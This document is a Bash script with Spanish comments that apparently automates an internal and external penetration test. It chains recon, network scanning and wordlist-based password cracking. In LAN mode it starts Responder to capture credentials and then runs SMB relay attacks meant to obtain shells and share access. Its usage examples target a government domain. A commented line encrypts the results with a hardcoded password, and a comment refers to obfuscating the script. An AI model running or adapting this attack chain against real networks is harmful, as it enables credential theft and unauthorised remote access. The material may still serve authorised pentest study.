#!/bin/bash
OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
RESET='\e[0m'
#bash-obfuscate discover-original.sh -o discover.sh

while getopts ":d:n:t:k:m:i:s:" OPTIONS
do
            case $OPTIONS in            
            d)     DOMAIN=$OPTARG;;
            n)     NOMBRE=$OPTARG;;
            k)     KEYWORD=$OPTARG;;
            t)     TYPE=$OPTARG;;
            i)     IPS=$OPTARG;;
            s)     SUBNET=$OPTARG;;
            m)     MODE=$OPTARG;;
            ?)     printf "Opcion invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

TYPE=${TYPE:=NULL}
DOMAIN=${DOMAIN:=NULL}
MODE=${MODE:=NULL}
SUBNET=${SUBNET:=NULL}
IPS=${IPS:=NULL}
KEYWORD=${KEYWORD:=NULL} # para cracker
echo "TYPE $TYPE"
if [ "$KEYWORD" == NULL ] || [ "$DOMAIN" == NULL ] &&  [ "$TYPE" != 'oscp' ]; then

cat << "EOF"

Opciones: 

-c : palabra KEYWORD para generar passwords
-d : dominio

Ejemplo 1: Escanear el listado de subredes (completo)
    discover.sh -t oscp -d htb.local -i ips.txt 
	discover.sh -d agetic.gob.bo -k agetic -t internet
	discover.sh -d agetic.gob.bo -k agetic -t lan -s subnet.txt
	discover.sh -d agetic.gob.bo -k agetic -t lan -s subnet.txt -m vpn
	discover.sh -d agetic.gob.bo -k agetic -t lan -i ips.txt 
	
EOF

exit
fi


echo -e "[+] Lanzando monitor $RESET" 
xterm -hold -e monitor.sh 2>/dev/null&
sleep 5

######################
if [ $TYPE == "internet" ]; then 	
	mkdir INTERNO
	mkdir EXTERNO
	cd EXTERNO
	recon.sh -d $DOMAIN -k $KEYWORD
	cd $DOMAIN
	lanscanner.sh -t completo -i $IPS -d $DOMAIN -m $MODE
	cracker.sh -e $KEYWORD -t completo
fi

if [ $TYPE == "oscp" ]; then 	
	#cd EXTERNO

	lanscanner.sh -t completo -i $IPS -d $DOMAIN -m vpn
	directory=`ls -hlt | grep '^d' | head -1 | awk '{print $9}'`
	echo "entrando al directorio $directory" # creado por lanscanner
	cd $directory

	#cracker.sh -d /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -t completo
	cracker.sh -d /usr/share/wordlists/top200.txt -t completo
	
fi

if [ $TYPE == "lan" ]; then 	
	# escaneo LAN
	
	echo -e "$OKBLUE Iniciando Responder $RESET"	
	iface=`ip addr | grep -iv DOWN | awk '/UP/ {print $2}' | egrep -v "lo|dummy|rmnet|vmnet" | sed 's/.$//'`
	#Borrar logs pasados
	#rm /usr/bin/pentest/Responder/logs/* 2>/dev/null
	/etc/init.d/smbd stop 
	cp /usr/bin/pentest/Responder/Responder.conf.normal /usr/bin/pentest/Responder/Responder.conf
	xterm -hold -e responder.sh -F -f -I $iface 2>/dev/null& 	
	
		
	if [ "$SUBNET" != NULL ]; then 	
	
		if [ "$MODE" != NULL ]; then 	
			lanscanner.sh -t completo -s $SUBNET -d $DOMAIN -m $MODE
		else
			lanscanner.sh -t completo -s $SUBNET -d $DOMAIN
		fi
		
		directory=`ls -hlt | grep '^d' | head -1 | awk '{print $9}'`
		pwd
		echo "entrando al directorio $directory" # creado por lanscanner
		cd $directory
		cracker.sh -e $KEYWORD -t completo
		
	fi
	if [ "$IPS" != NULL ]; then 	
	
		if [ "$MODE" != NULL ]; then 	
			lanscanner.sh -t completo -i $IPS -d $DOMAIN -m $MODE
		else
			lanscanner.sh -t completo -i $IPS -d $DOMAIN
		fi
				
		directory=`ls -hlt | grep '^d' | head -1 | awk '{print $9}'`
		echo "entrando al directorio $directory" # creado por lanscanner
		cd $directory
		cracker.sh -e $KEYWORD -t completo
	fi
	
	if [ "$IPS" = NULL ] && [ "$SUBNET" = NULL ]; then
	
		if [ "$MODE" != NULL ]; then 	
			lanscanner.sh -t completo -d $DOMAIN -m $MODE #vpn
		else
			lanscanner.sh -t completo -d $DOMAIN
		fi
				
		directory=`ls -hlt | grep '^d' | head -1 | awk '{print $9}'`		
		echo "entrando al directorio $directory" # creado por lanscanner
		cd $directory
		cracker.sh -e $KEYWORD -t completo		
	fi		
	mv /usr/bin/pentest/Responder/logs/* `pwd`/responder 2>/dev/null

	########  SMBRelay 32 bits #########
	echo -e "\t[+] Testeando SMBRelay (shell - 32 bits)"
	killall xterm
	pwd
	smbrelay.sh -t shell32bits &
	sleep 600	
	# Matar responder, puede causar problemas de red
	kill -9 `ps aux | grep -i responder.sh| head -1 | awk '{print $2}'`
	kill -9 `ps aux | grep -i ntlmrelayx.py| head -1 | awk '{print $2}'`
	kill -9 `ps aux | grep -i configweb.sh| head -1 | awk '{print $2}'`
	sleep 10

	########  SMBRelay 64 bits #########
	echo -e "\t[+] Testeando SMBRelay (shell - 64 bits)"	
	pwd
	smbrelay.sh -t shell64bits &
	sleep 600	
	# Matar responder, puede causar problemas de red
	kill -9 `ps aux | grep -i responder.sh| head -1 | awk '{print $2}'`
	kill -9 `ps aux | grep -i ntlmrelayx.py| head -1 | awk '{print $2}'`
	kill -9 `ps aux | grep -i configweb.sh| head -1 | awk '{print $2}'`
	sleep 10
	
	########  SHARE #########
	echo -e "\t[+] Testeando SMBRelay (shares)"	
	pwd
	smbrelay.sh -t share &
	sleep 600	
	# Matar responder, puede causar problemas de red
	kill -9 `ps aux | grep -i responder.sh| head -1 | awk '{print $2}'`
fi

#Encritar resultados
#7z a .resultados.7z .resultados.db -pcANRHPeREPZsCYGB8L64 >/dev/null
#rm .resultados.db

